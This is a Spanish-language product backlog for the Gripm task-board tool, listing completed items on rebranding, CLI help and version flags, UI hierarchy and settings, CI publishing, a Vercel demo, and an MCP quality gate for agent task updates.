La interfaz ya se presenta como gripm, pero la documentación operativa y las plantillas activas todavía describen el producto como "anteriormente DevBoard". Consolidar el nombre Gripm en la aplicación y en las guías vigentes, hacer explícito el corte de marca posterior a v1.0.0 y dejar intactos el changelog y el backlog histórico. Mantener las rutas de migración de datos heredados para no arriesgar información de proyectos existentes.

**Criterios de Aceptación:**
- [x] #1 Las guías y plantillas vigentes presentan el producto únicamente como Gripm y no como "anteriormente DevBoard"
- [x] #2 La interfaz web y los metadatos del producto identifican Gripm de forma consistente
- [x] #3 CHANGELOG.md y las tareas históricas del backlog permanecen intactos
- [x] #4 Las claves y carpetas heredadas se conservan solo como compatibilidad/migración de datos, sin promocionarlas como marca vigente
- [x] #5 Las validaciones de build, tests y sincronización del backlog pasan

---

#### [DEV-200] Corregir las opciones de versión de la CLI
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.4

Al ejecutar `gripm --version`, la CLI ignora la opción y arranca el servidor web en vez de mostrar la versión instalada. Esto causa un efecto secundario inesperado y puede ocupar un puerto o abrir el navegador para una consulta informativa. Implementar y documentar `--version` y su alias `-v`, y verificar que ambos funcionen en el paquete npm extraído.

**Criterios de Aceptación:**
- [x] #1 `gripm --version` imprime únicamente la versión declarada en el paquete y termina exitosamente sin iniciar el servidor ni abrir un navegador
- [x] #2 `gripm -v` produce el mismo resultado que `--version`
- [x] #3 La ayuda del CLI documenta ambas opciones de versión
- [x] #4 El smoke test del paquete npm comprueba la salida y terminación de ambas opciones
- [x] #5 Pasan las validaciones específicas de CLI, la suite unificada y la sincronización del backlog

---

#### [DEV-201] Corregir edición inmediata y visibilidad de relaciones en items
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.4

Al crear una tarea en un proyecto Backlog.md, el API responde con un ID temporal aunque la tarea se persiste usando su código canónico. Al abrir y editar inmediatamente la tarea, la UI envía un PUT con el ID temporal y recibe 404. Además, el endpoint de creación no persiste parentId, blocks, blockedBy ni relatedTo; al reabrir el modal esas relaciones no aparecen. Alinear la identidad de la respuesta con el formato persistido, conservar las relaciones al crear y hacer que las relaciones guardadas se reconozcan claramente al editar.

**Criterios de Aceptación:**
- [x] #1 Crear una tarea Markdown devuelve la identidad canónica que acepta el endpoint de edición y puede editarse inmediatamente sin 404
- [x] #2 El endpoint de creación persiste parentId, blocks, blockedBy y relatedTo en el archivo y los devuelve en la respuesta
- [x] #3 Al reabrir una tarea con relaciones, el modal las muestra expandidas con suficiente contexto para identificar cada tarea relacionada
- [x] #4 El flujo de regresión automatizado cubre creación, lectura, edición y persistencia de relaciones
- [x] #5 Pasan TypeScript, pruebas relevantes, suite completa, build y sincronización del backlog

---

#### [DEV-202] Acceso rápido para quitar relaciones y ver jerarquía de ítems
- **Prioridad**: `high` | **Tipo**: `improvement`
- **Sprint / Milestone**: 1.0.4

Las relaciones guardadas se resumen en el modal, pero para quitarlas hay que expandir la sección y buscar el chip correspondiente. Además, la relación jerárquica parent/epic no se ve de forma consistente en las tarjetas del Kanban ni en la vista Backlog, que actualmente muestra solo el campo legacy `epic`. Hacer removibles las relaciones desde su resumen y presentar el padre resuelto por código y título en las vistas de trabajo.

**Criterios de Aceptación:**
- [x] #1 Cada relación existente en el resumen del modal se puede quitar con una acción directa y accesible, sin expandir la sección
- [x] #2 Las tarjetas del Kanban muestran código y título del ítem padre cuando `parentId` resuelve a un ítem del proyecto
- [x] #3 El Backlog muestra bajo el título la relación `parentId` resuelta, sin requerir habilitar una columna opcional
- [x] #4 Las relaciones no resueltas siguen mostrando el identificador almacenado sin fallar ni desaparecer
- [x] #5 Pasan las pruebas de regresión, UX, TypeScript, suite completa, build y sincronización del backlog

---

#### [DEV-203] Configurar metadatos visibles en tarjetas de ítems
- **Prioridad**: `medium` | **Tipo**: `improvement`

Permitir que cada usuario elija qué información de una tarea se muestra directamente en las tarjetas del Kanban sin abrir el modal, por ejemplo módulo, sprint, release, avance de criterios, etiquetas, asignados y relaciones. La preferencia debe persistir, ser fácil de descubrir desde configuración y evitar saturar las tarjetas, con el mismo resultado en las vistas donde se reutiliza el componente.

**Criterios de Aceptación:**
- [x] #1 Configuración permite activar o desactivar campos de metadatos visibles en tarjetas
- [x] #2 Las preferencias persisten entre sesiones y cuentan con valores por defecto razonables para instalaciones existentes
- [x] #3 Las tarjetas Kanban respetan la selección sin abrir el modal
- [x] #4 La opción de jerarquía/relaciones no duplica información ya visible ni colisiona con interacciones de tarjetas
- [x] #5 La configuración es accesible, responsiva y localizada en español e inglés

---

#### [DEV-204] Aclarar los productos Gripm y sus comandos de uso
- **Prioridad**: `high` | **Tipo**: `improvement`
- **Sprint / Milestone**: 1.0.4

Hacer que una persona nueva pueda distinguir qué ofrece cada parte del ecosistema Gripm, elegir el comando correcto para su objetivo y combinar los productos sin creer que son dependencias obligatorias entre sí.

### Modelo de producto

- **Gripm** es la marca y el ecosistema.
- **Gripm Board** (`@gripm/board`) es el producto de gestión del backlog: interfaz web local, CLI y servidor MCP para exponer ese mismo backlog a agentes.
- **Gripm MCP** (`gripm-mcp` o `gripm mcp`) es una interfaz de Board para agentes, distribuida dentro del paquete Board; se ejecuta sin abrir la interfaz web, pero no es hoy un paquete/producto autónomo.
- **Gripm Playbook** (`@gripm/playbook`) es el producto independiente de metodología y skills para equipos/agentes; puede utilizarse sin Board.
- **Gripm Suite** no existe todavía como paquete o instalador y queda fuera del alcance de esta tarea.

Board incluye algunos materiales de agente y ofrece `gripm playbook sync` para sincronizar materiales canónicos en un proyecto. Ese comando no instala el paquete Playbook ni equivale a instalar/actualizar Board. La ayuda del CLI y las guías de inicio deben dejar claras estas diferencias, indicar qué comandos se usan para abrir Board o conectar MCP, y evitar nombres de paquetes obsoletos o ambiguos.

La documentación debe ser honesta sobre lo que existe hoy y no prometer una instalación unificada todavía.

**Criterios de Aceptación:**
- [x] #1 README en español e inglés explica con el mismo modelo Gripm, Board, MCP y Playbook, incluida la independencia real y la relación de MCP con Board.
- [x] #2 Una guía breve de decisión asigna de forma inequívoca los comandos existentes a abrir Board, inicializar un proyecto, conectar MCP y sincronizar materiales del Playbook.
- [x] #3 La ayuda del CLI presenta el comando por defecto y sus subcomandos con propósitos, opciones de destino y efectos claramente diferenciados.
- [x] #4 Las instrucciones de instalación y configuración MCP usan el nombre publicado `@gripm/board` y no sugieren paquetes o comandos no existentes.
- [x] #5 Se aclara que `gripm playbook sync` sincroniza materiales del Playbook en un proyecto; no instala el paquete Playbook ni Gripm Suite.
- [x] #6 Suite se describe solo como una posibilidad futura, sin prometer instalador, paquete agregador o flujo de instalación que todavía no exista.
- [x] #7 README, ayuda del CLI y skills incluidas en Board no se contradicen en nombres de productos ni comandos.
- [x] #8 Pasan las verificaciones de CLI/documentación aplicables, TypeScript, tests, build, publicación y sincronización del backlog.

---

#### [DEV-206] Evitar solapamiento entre filtros y contadores en español
- **Prioridad**: `medium` | **Tipo**: `improvement`
- **Sprint / Milestone**: 1.0.4

En el tablero, a 1366×768 y con la interfaz en español, el contador de tareas pendientes se solapaba con el filtro de prioridad P3. La barra de filtros debe conservar una composición compacta en desktop sin saltar grupos enteros a una segunda línea; los filtros de prioridad siguen disponibles desde el panel Filtros cuando no caben como accesos rápidos.

**Criterios de Aceptación:**
- [x] #1 El contador de pendientes no se solapa con los controles visibles a 1366×768 en español
- [x] #2 Los filtros de prioridad siguen accesibles desde el panel de Filtros cuando no caben como accesos rápidos
- [x] #3 Los accesos rápidos de prioridad solo ocupan espacio inline cuando el viewport permite conservar una única fila compacta

---

#### [DEV-208] Clarificar narrativa de README para rookies y desarrolladores
- **Prioridad**: `medium` | **Tipo**: `improvement`
- **Sprint / Milestone**: 1.0.5

Hacer que la documentación sea accesible y comprensible para perfiles novatos, no técnicos y vibe coders sin perder rigor técnico para desarrolladores e ingenieros consolidados. Se reorganiza el flujo de lectura con revelación progresiva, se elimina la burocracia conceptual al inicio y se preserva toda la información dura de arquitectura, MCP y CLI.

**Criterios de Aceptación:**
- [x] #1 Reestructurar README.es.md y README.md con revelación progresiva: inicio rápido directo, conexión de IA sin fricción y arquitectura avanzada al final.
- [x] #2 Eliminar tecnicismos defensivos y redundancias sobre instalación de Playbook en la portada, explicando el comando gripm playbook sync constructivamente.
- [x] #3 Desacoplar la sección de desinstalación (--uninstall) de la guía de inicio y ubicarla en su propia sección dedicada.
- [x] #4 Preservar el 100% de la información técnica (motor dual, catálogo MCP de 12 tools, flags CLI, estrategias Git, comandos de integridad y guía core).
- [x] #5 Pasan las verificaciones de integridad de backlog y pirámide de calidad (npm run backlog:check, npm test, npm run publish:check).

---

#### [DEV-209] Consistencia alineacion y subcomandos de ayuda en gripm CLI
- **Prioridad**: `medium` | **Tipo**: `improvement`
- **Sprint / Milestone**: 1.0.5

Resolver las inconsistencias en la ayuda del CLI (`bin/gripm.js` y `bin/gripm-mcp.js`):
1. Distinguir semánticamente Comandos posicionales (`gripm`, `gripm mcp`, `gripm playbook sync`) de Opciones de ejecución.
2. Soporte nativo de `--help` y `-h` en subcomandos:
   - `gripm mcp --help` y `gripm-mcp --help` deben desplegar la descripción del servidor MCP y sus parámetros en lugar de bloquearse esperando JSON-RPC por stdin.
   - `gripm playbook --help` y `gripm playbook sync --help` deben mostrar la ayuda con código de salida 0 en lugar de abortar con exit code 1.
3. Documentar las opciones existentes: `--single`, `--multi`, opciones no interactivas de `--init` y flags avanzadas de `playbook sync` (`--branch`, `--remote`, `--dry-run`, `--force`).
4. Alinear el host por defecto documentado (`127.0.0.1`) con la implementación real.
5. Corregir el espaciado y alineación visual de columnas en la salida de terminal.

**Criterios de Aceptación:**
- [x] #1 gripm --help y gripm -h presentan una salida formateada y alineada, diferenciando comandos de opciones y documentando --single, --multi y host 127.0.0.1
- [x] #2 gripm mcp --help, gripm mcp -h y gripm-mcp --help muestran la descripcion del servidor MCP con codigo de salida 0 sin colgarse en stdin
- [x] #3 gripm playbook --help, gripm playbook sync --help y gripm playbook -h muestran la guia de uso de sincronizacion con codigo de salida 0
- [x] #4 Las opciones avanzadas de --init (--no-skill, --no-agents, etc.) y playbook sync (--dry-run, --force, --branch, --remote) estan documentadas adecuadamente
- [x] #5 La suite de pruebas npm test, npm run backlog:check y npm run publish:check pasan con codigo de salida 0

---

#### [DEV-210] I18n de Tarjetas y Estabilidad Visual Zero-CLS en Cambio de Idioma
- **Prioridad**: `p2` | **Tipo**: `ux`
- **Sprint / Milestone**: 1.0.5
**Criterios de Aceptación:**
- [x] #1 1. Claves de prioridad 'priority.p0', 'priority.p1', 'priority.p2', 'priority.p3' agregadas en 'en.json' y 'es.json' y consumidas dinámicamente en 'ItemCard.tsx'.
- [x] #2 2. Textos 'Progreso', 'Bloqueada por...' y 'Bloquea...' en 'ItemCard.tsx' consumen claves de internacionalización ('card.progress', 'card.blockedBy', 'card.blocks').
- [x] #3 3. Pestañas de navegación en 'Header.tsx' y pills de prioridad adoptan anchos estables/mínimos para evitar jitter y reacomodamiento visual (Zero-CLS) al alternar idioma.

---

#### [DEV-211] Filtro de Sprints en Tablero y Corrección de Banner CLI
- **Prioridad**: `p2` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.5
**Criterios de Aceptación:**
- [x] #1 1. En 'KanbanBoard.tsx', la opción 'Todos los sprints' solo se renderiza si existen 2 o más sprints registrados; cuando no hay sprints o hay 1 solo, se evita la redundancia mostrando solo la opción correspondiente.
- [x] #2 2. La inicialización y persistencia de 'activeSprint' en 'KanbanBoard.tsx' cae en un fallback limpio cuando 'all' no está disponible en la lista de opciones.
- [x] #3 3. En 'bin/gripm.js', el cálculo de ancho visual de las líneas del banner informativo contempla los caracteres de ancho extendido (emojis) para que el borde vertical derecho '│' permanezca alineado en una sola columna fija.

---

#### [DEV-212] Jerarquía de Ítems Selector de Epic Parent en Panel Lateral de ItemModal
- **Prioridad**: `p2` | **Tipo**: `ux`
- **Sprint / Milestone**: 1.0.5
**Criterios de Aceptación:**
- [x] #1 1. En 'ItemModal.tsx', la relación vertical 'parentId' se remueve de la sección colapsable de relaciones (manteniendo bloques de blockedBy, blocks y relatedTo).
- [x] #2 2. Se incorpora el campo 'Epic / Épica' (o 'Item Padre') en la columna lateral derecha de 'ItemModal.tsx', debajo de etiquetas y arriba de módulo y código.
- [x] #3 3. El selector permite seleccionar un padre de la lista de candidatos (epics, initiatives, features) o desasignar fácilmente, persistiendo el campo 'parentId' de forma simétrica.

---

#### [DEV-213] SettingsView Limpieza de Badges Desacople de Manual Ranking e Integracion de Board Density
- **Prioridad**: `p2` | **Tipo**: `ux`
- **Sprint / Milestone**: 1.0.5
**Criterios de Aceptación:**
- [x] #1 1. En 'SettingsView.tsx', se elimina el badge duplicado/desalineado junto al título de 'Project Work Methodology'.
- [x] #2 2. 'Manual Ranking and Drag & Drop' se extrae de la tarjeta de Auto-save y se ubica como control propio e independiente dentro del grid de configuración.
- [x] #3 3. 'KanbanBoard.tsx' e 'ItemCard.tsx' consumen 'config.density' aplicando clases de densidad compacta ('compact') vs estándar ('comfortable') en gaps de columna y espaciados internos de tarjetas.

---

#### [DEV-214] ReleasesView Nomenclatura Unreleased Estabilidad de Contenedor y Boton de Nueva Version
- **Prioridad**: `p2` | **Tipo**: `ux`
- **Sprint / Milestone**: 1.0.5
**Criterios de Aceptación:**
- [x] #1 1. En 'ReleaseAssembler.tsx', el contenedor raíz adopta el estándar 'w-full flex-1 p-4 sm:p-6 min-w-0 max-w-[1680px] mx-auto', garantizando un ancho inmutable independientemente de la cantidad de ítems en la vista.
- [x] #2 2. La pestaña de filtro y chips de estado se actualizan a 'Unreleased' ('No liberadas' en español) en 'en.json', 'es.json' y 'ReleaseAssembler.tsx'.
- [x] #3 3. El botón de nueva versión se normaliza a 'New Release' / 'Nueva Versión' sin texto redundante de preparación.

---

#### [DEV-215] Tolerancia de flags de ayuda y clarificación de comandos y servidor MCP en CLI
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.5

Resolver irregularidades y fricciones de usabilidad en la interfaz de línea de comandos (CLI) y servidor MCP:
1. **Tolerancia de flags de ayuda:** Cuando el usuario pasa variantes comunes de ayuda como `--h` o `-help` (o `help`), el CLI no debe abrir el servidor web ni buscar puertos alternativos (ej: 4101), sino responder inmediatamente imprimiendo la ayuda y saliendo con código 0. Esto aplica tanto a `gripm`, `gripm-mcp`, `gripm mcp` como a `gripm playbook`.
2. **Claridad en comandos y ejecutable MCP:** En la sección `Comandos:` de `gripm --help`, separar los subcomandos ejecutables reales (`gripm mcp`, `gripm playbook sync`) del binario directo independiente `gripm-mcp` (provisto para clientes MCP como Cursor y Claude Desktop), evitando la impresión errónea de que `gripm-mcp` es un subcomando anidado.
3. **Eliminación de disclaimers confusos:** Retirar de la salida de `--help` la mención `"Gripm Suite no tiene aún un instalador"`, la cual genera confusión al referirse a un elemento de roadmap no publicado.

**Criterios de Aceptación:**
- [x] #1 bin/gripm.js y scripts/mcp-server.ts aceptan --h, -help, --help y -h terminando con codigo 0 sin iniciar Vite ni abrir puertos
- [x] #2 gripm --help lista unicamente subcomandos directos en Comandos: y documenta gripm-mcp en seccion de integracion MCP
- [x] #3 La salida de ayuda elimina la mencion innecesaria a Gripm Suite y su falta de instalador
- [x] #4 verify-resilience-and-cli.js y test-package-smoke.js auditan las nuevas variantes de flag y la estructura limpia de ayuda
- [x] #5 La suite de pruebas npm test, npm run backlog:check y npm run publish:check pasan con codigo de salida 0

---

#### [DEV-216] Eliminar creación preventiva y auto-regeneración no solicitada de directorios backlog tasks
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.5

Evitar la creación involuntaria de carpetas `backlog/tasks` en directorios arbitrarios del sistema (ej: carpetas raíz o home del usuario):
1. **Operación de solo lectura pura en el servidor (`vite.config.ts`):** `readProjectBacklog` no debe invocar `fs.mkdirSync(tasksDir)`. Si el directorio no existe, debe retornar una colección vacía (`items: []`) sin mutar el disco.
2. **Cero creación preventiva en el CLI (`bin/gripm.js`):** Al detectar el tipo de almacenamiento en el arranque, `bin/gripm.js` no debe crear `backlog/tasks` al vuelo. La creación en disco debe ocurrir exclusivamente ante `--init` explícito o cuando el usuario crea una tarea.
3. **Protección del directorio home en el registro (`bin/gripm.js`):** Evitar auto-registrar el directorio `os.homedir()` en `~/.gripm/registry.json` ante ejecuciones no intencionales de la CLI sin flag `--repo` ni `--init`.
4. **Limpieza de registros y carpetas parásitas:** Purgar del registro global de proyectos las rutas huérfanas o accidentales (`.code`, home del usuario y temporales inexistentes) y eliminar las carpetas residuales vacías creadas indebidamente.

**Criterios de Aceptación:**
- [x] #1 readProjectBacklog en vite.config.ts es estrictamente de solo lectura y no ejecuta mkdirSync si tasksDir no existe
- [x] #2 bin/gripm.js no crea preventivamente la carpeta backlog/tasks en disco al arrancar
- [x] #3 bin/gripm.js evita registrar el directorio home del usuario (os.homedir()) en registry.json en ejecuciones por defecto
- [x] #4 Se limpian las entradas parasitas de ~/.gripm/registry.json y las carpetas residuales huerfanas generadas por auto-creacion
- [x] #5 La suite de pruebas npm test, npm run backlog:check y npm run publish:check pasan con codigo de salida 0

---

#### [DEV-217] Corrección de paridad multiplataforma en CI y smoke test de jerarquías
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 1.0.5

Resolver las fallas en GitHub Actions tras la publicación de v1.0.5:
1. **Fallo en Browser smoke test (`scripts/test-ui-smoke.js`):** Al mover el selector de Épica/Padre al panel de atributos lateral derecho en DEV-212, el smoke test de Playwright esperaba encontrar el badge de padre huérfano (`ORPHAN-PARENT-001`) y el botón de remoción rápida dentro de la pestaña de Relaciones. Además, si el padre es huérfano, el nuevo `<select>` no tenía una opción para renderizar su identificador, provocando que desapareciera visualmente del DOM y produciendo un timeout de 30 segundos.
2. **Fallo en Verify en Ubuntu y macOS (`scripts/verify-audit-ux-baseline.js`):** En Windows las aserciones de delta se omitían por diferencias de separadores de ruta (`\`), pero en runners POSIX (Ubuntu/macOS) el verificador evalúa que no existan hallazgos nuevos fuera de los 12 falsos positivos conocidos de `UX-010`. Las modificaciones de interfaz introducidas en v1.0.5 generaron 11 observaciones (en `ItemCard.tsx`, `ItemModal.tsx` y `SettingsView.tsx`) no registradas en el baseline.

**Criterios de Aceptación:**
- [x] #1 En ItemModal.tsx, renderizar opcion para parentId no resuelto en el selector de Jerarquia y permitir su remocion rapida accesible
- [x] #2 En scripts/test-ui-smoke.js, sincronizar las aserciones con la nueva ubicacion del atributo de jerarquia y validar ejecucion verde en Playwright
- [x] #3 Subsanar las 11 observaciones de UX y micro-tipografia en ItemCard.tsx, ItemModal.tsx y SettingsView.tsx
- [x] #4 Actualizar audit-ux-baseline.json con rutas POSIX normalizadas preservando los 12 casos residuales de UX-010
- [x] #5 La suite de pruebas npm test, npm run test:ui y npm run backlog:check pasa con codigo 0

---

#### [DEV-218] Desacople de Sprints y defaults minimalistas para Gripm Core
- **Prioridad**: `high` | **Tipo**: `feature`

Establecer Gripm Core como un producto minimalista por defecto, desacoplando Sprints y Scrum de la configuración inicial del tablero:
1. **Defaults canónicos orientados a flujo continuo:** En `src/types.ts` y en la resolución de configuración, la metodología por defecto pasa a ser `kanban` en lugar de `scrumban`, con la pestaña de Sprints deshabilitada por defecto (`enabledTabs: { kanban: true, sprint: false, release: true }`).
2. **Ocultamiento condicional en UI (Zero-Leakage):** Cuando el módulo de Sprints esté inactivo (`enabledTabs.sprint === false` o metodología `kanban`), la interfaz debe ocultar limpiamente los selectores y metadatos de Sprint en `ItemModal`, `FilterBar` y tarjetas, sin dejar huecos ni campos mudos.
3. **Preservación total de retrocompatibilidad:** Los proyectos que ya tengan configurado `sprint: true` o metodología `scrum`/`scrumban` continúan viendo y usando Sprints sin alteración ni pérdida de datos.

**Criterios de Aceptación:**
- [x] #1 La metodologia por defecto en configuraciones nuevas es kanban con enabledTabs.sprint en false
- [x] #2 ItemModal oculta el selector de sprint cuando enabledTabs.sprint es false o methodology es kanban
- [x] #3 FilterBar oculta el filtro y dropdown de sprints cuando el modulo de sprints no esta activo
- [x] #4 Proyectos con configuracion previa de sprints o scrumban preservan la visibilidad de sprints sin regresion
- [x] #5 La suite de verificacion npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-219] Onboarding CLI con selección de perfiles y add-ons declarativos en init
- **Prioridad**: `high` | **Tipo**: `feature`

Evolucionar el asistente de inicialización `gripm --init` (`scripts/initScaffold.js`) para ofrecer perfiles de adopción y selección declarativa de add-ons:
1. **Selección de perfil inicial en CLI:** Ofrecer una primera decisión clara y concisa al usuario:
   - `[1] Minimalista AI-First (Recomendado)`: Núcleo ultraligero con Kanban puro, sin ceremonias ni timeboxes (`methodology: "kanban"`, `enabledTabs.sprint: false`, solo `backlog/tasks/` y `SKILL.md`).
   - `[2] Baterías Incluidas`: Suite completa habilitando Sprints/Scrum, Releases y gobernanza de agentes.
   - `[3] Personalizado`: Permite seleccionar granularmente cada add-on (Sprints, Releases, AGENTS.md, scripts en package.json, etc.).
2. **Generación explícita de `.gripm/config.json`:** El archivo de configuración resultante debe persistir explícitamente `methodology` y `enabledTabs`, eliminando ambigüedades o fallbacks implícitos en el arranque del servidor.
3. **Flags no interactivas (`--minimal`, `--full`):** Soporte en CLI para flags de automatización en scripts o CI.

**Criterios de Aceptación:**
- [x] #1 scripts/initScaffold.js presenta selector de perfiles de inicializacion (Minimalista AI-First, Baterias Incluidas, Personalizado)
- [x] #2 El perfil Minimalista AI-First configura methodology kanban y enabledTabs.sprint false sin crear archivos innecesarios
- [x] #3 .gripm/config.json persiste explicitamente methodology y enabledTabs segun la eleccion del usuario
- [x] #4 Soporte para flags no interactivas (--minimal, --full) en el comando gripm --init
- [x] #5 npm test y npm run backlog:check pasan con codigo 0

---

#### [DEV-220] Panel de gestión de módulos y add-ons en configuración web
- **Prioridad**: `medium` | **Tipo**: `feature`

Diseñar e incorporar en `SettingsView` un panel centralizado de **"Módulos & Add-ons"** para activar o desactivar capacidades en caliente:
1. **Catálogo visual de add-ons:** Presentar tarjetas con interruptores claros para cada módulo del producto:
   - 🗂️ **Kanban Core & Backlog:** Siempre activo (núcleo base indispensable).
   - ⏱️ **Sprints & Timeboxing (Scrum):** Activa/desactiva la pestaña Sprints y sus campos en tareas/filtros.
   - 🚀 **Release Management & Versioning:** Activa/desactiva la pestaña Releases y el empaquetado formal de versiones.
   - 🌐 **Multi-Project Hub:** Switcher de proyectos y registro en el hub global.
2. **Activación instantánea sin recarga:** Al encender o apagar un add-on, la barra superior de navegación y los modales reaccionan de inmediato y persisten el cambio en `.gripm/config.json`.
3. **Descubribilidad no invasiva:** Si el usuario está en modo minimalista, mostrar en la configuración una vía obvia y simple para expandir capacidades cuando el equipo o el proyecto lo requiera.

**Criterios de Aceptación:**
- [x] #1 SettingsView incluye seccion dedicada de Modulos y Add-ons con explicacion clara de cada capacidad
- [x] #2 Toggles individuales para Sprints, Releases y Multi-Hub con persistencia inmediata en .gripm/config.json
- [x] #3 La barra de navegacion principal refleja altas y bajas de pestanas de forma reactiva y sin recargar la pagina
- [x] #4 Textos completamente localizados en espanol e ingles en utils/i18n.ts
- [x] #5 npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-221] Inversión de orden en pipeline de publicación y auto-creación de GitHub Release
- **Prioridad**: `high` | **Tipo**: `feature`

Reestructurar el flujo de entrega continua en `.github/workflows/publish.yml` para garantizar que la publicación a npmjs.com y la creación de la GitHub Release ocurran de forma atómica y estrictamente posterior a la validación completa del código:
1. **Inversión de fases en el workflow de publicación:** Mover el paso `npm publish` al final del pipeline. La ejecución de la suite completa (`tsc`, `npm test`, `npm run backlog:check`, `npm run audit:ux`, `npm run build`, `npm run publish:check` y `npm pack --dry-run`) debe preceder obligatoriamente a la publicación. Si cualquier verificación falla, el proceso debe abortar sin mutar el registro de npm.
2. **Auto-creación de GitHub Release:** Integrar en el workflow la creación automática de la Release oficial en GitHub utilizando el CLI nativo `gh release create` y el token de Actions con permisos `contents: write`. El título y las notas de la versión deben extraerse automáticamente desde `backlog/releases.json` / `CHANGELOG.md` para evitar pasos manuales o scripts externos.
3. **Sincronización atómica:** Asegurar que el tag de Git, la release documental en GitHub y el paquete publicado en npmjs.com compartan la misma foto verificada y queden sellados en el mismo evento sin duplicar ejecuciones ni dejar artefactos a medio publicar.

**Criterios de Aceptación:**
- [x] #1 En publish.yml, la piramide completa de pruebas y verificacion se ejecuta antes del paso de publicacion en npm
- [x] #2 Si cualquier paso de verificacion o build falla, el job se detiene sin publicar en npm ni crear la GitHub Release
- [x] #3 Tras publicar exitosamente en npmjs.com, publish.yml crea la GitHub Release oficial extrayendo titulo y notas desde backlog/releases.json
- [x] #4 El workflow maneja idempotencia evitando fallas si la version o la release ya existian en el repositorio
- [x] #5 La suite de pruebas y scripts de integridad local pasan con codigo 0

---

#### [DEV-222] Modo Sandbox interactivo y deploy público en Vercel con dataset en memoria
- **Prioridad**: `high` | **Tipo**: `feature`

Preparar una versión web autónoma de Gripm Board para desplegar en Vercel, orientada a demostraciones públicas desde dispositivos móviles y comunidades técnicas sin requerir un CLI ni daemon local:
1. **Detección automática de entorno y fallback en memoria:** Si la aplicación detecta que está corriendo en la web sin conexión al socket o CLI local, inicializa automáticamente un adaptador en memoria y LocalStorage con un dataset precargado (un sprint activo, tareas en distintas columnas, criterios de aceptación interactivos y un release publicado con changelog) sin mostrar pantallas vacías ni errores de red.
2. **Selector de formato dual interactivo:** Incorporar en la tarjeta o modal de tarea un selector que permita previsualizar en vivo cómo se serializa esa tarea en Markdown (`backlog/tasks/*.md`) frente a JSON unificado (`.gripm/backlog.json`).
3. **Optimización móvil estricta (Zero-CLS & Touch Targets):** Interfaz completamente adaptada a pantallas móviles (360px a 430px) con áreas táctiles de al menos 44px de altura/anchura y navegación táctil fluida.
4. **Configuración de hosting SPA:** Configuración limpia de `vercel.json` para soportar rutas SPA sin errores 404 en navegación directa o recarga.
5. **Enlace a demo en README:** Incorporar badge y enlace directo a la demo en producción en la cabecera de `README.md` y `README.es.md`.

**Criterios de Aceptación:**
- [x] #1 Compilacion de produccion con Vite limpia hacia Vercel con configuracion de vercel.json para soportar rutas SPA
- [x] #2 Deteccion automatica de entorno sin daemon que monta de inmediato dataset de prueba en memoria sin errores de red
- [x] #5 Enlace directo a la demo en produccion incorporado en la cabecera del README.md
- [x] #6 npm test y npm run backlog:check pasan con codigo 0

---

#### [DEV-223] Compatibilidad amplia de runtime Node 20 LTS y evaluación de distribución binaria
- **Prioridad**: `high` | **Tipo**: `feature`

Reducir la fricción de adopción eliminando el bloqueo estricto a Node.js 22.6+ y ampliando el soporte a la versión LTS activa:
1. **Compatibilidad con Node.js 20.x LTS:** Permitir que el CLI (`gripm`) y el servidor MCP (`gripm-mcp`) ejecuten normalmente en Node.js 20.x sin advertencias de incompatibilidad de motor en `package.json`.
2. **Auditoría de APIs dependientes de v22:** Identificar y reemplazar cualquier API exclusiva de Node 22.6+ por alternativas estándar compatibles con v20 (o polyfills equivalentes).
3. **Distribución binaria independiente:** Diseñar y documentar una prueba de concepto para empaquetar binarios ejecutables standalone para macOS (arm64/x64) y Linux mediante Bun o herramientas nativas (ej. Node Single Executable Application / pkg), facilitando la distribución en gestores de paquetes como Homebrew sin requerir gestores de versiones de Node.

**Criterios de Aceptación:**
- [x] #1 El CLI y el servidor MCP ejecutan normalmente en Node.js 20.x LTS sin advertencias de engine en package.json
- [x] #2 Auditoria y reemplazo de cualquier API de Node exclusiva de v22.6+ por alternativas compatibles con v20
- [x] #3 Prueba de concepto documentada para empaquetar binarios ejecutables independientes para macOS y Linux
- [x] #4 La suite de verificacion npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-224] Execution Gatekeeper en el servidor MCP para verificación objetiva de tareas
- **Prioridad**: `high` | **Tipo**: `feature`

Transformar el servidor MCP de Gripm de un gestor de datos pasivo a un sistema activo de supervisión y arbitraje de calidad para agentes de IA:
1. **Compuerta estricta de Criterios de Aceptación:** Cuando un LLM intente avanzar el estado de una tarea a `ready` (entrega formal de desarrollo) o `done`, la herramienta `gripm_update_task` debe validar que el 100% de los criterios de aceptación estén tildados (`- [x]`), rechazando la mutación en caso contrario.
2. **Ejecución de comandos de verificación asociados:** Soporte opcional para asociar comandos de validación en la tarea (por ejemplo, `verifyCommand: npm test` en frontmatter), ejecutándolos en un subproceso antes de aceptar el cambio de estado.
3. **Mensajes de error determinísticos:** En caso de rechazo, el servidor MCP debe retornar una respuesta clara y estructurada que detalle exactamente qué criterio o test falló y qué acción correctiva debe ejecutar el agente antes de reintentar.

**Criterios de Aceptación:**
- [x] #1 gripm_update_task rechaza la transicion a ready o done si existen criterios de aceptacion pendientes de marcar
- [x] #2 Soporte para asociar comandos de verificacion ejecutables en la tarea antes de aceptar la certificacion
- [x] #3 Mensajes de error deterministicos en la respuesta MCP que explican con claridad al agente la falla y como resolverla
- [x] #4 npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-227] Actualización integral de documentación multilingüe README en y es post-evolución
- **Prioridad**: `low` | **Tipo**: `task`

Actualizar de forma exhaustiva, simétrica y coherente la documentación del repositorio en inglés (`README.md`) y español (`README.es.md`) una vez culminado el plan de evolución:
1. **Documentación del Sandbox en Vercel:** Incluir enlace destacado a la demo web interactiva y explicar su funcionamiento como entorno sandbox de demostración sin daemon.
2. **Nuevos perfiles del asistente CLI:** Documentar los perfiles de inicialización de `gripm --init` (Minimalista AI-First vs Baterías Incluidas) y sus flags no interactivas (`--minimal`, `--full`).
3. **Guía de integración del Gatekeeper MCP:** Explicar el funcionamiento de la compuerta de calidad de `gripm-mcp` para agentes de IA y la configuración de comandos de verificación.
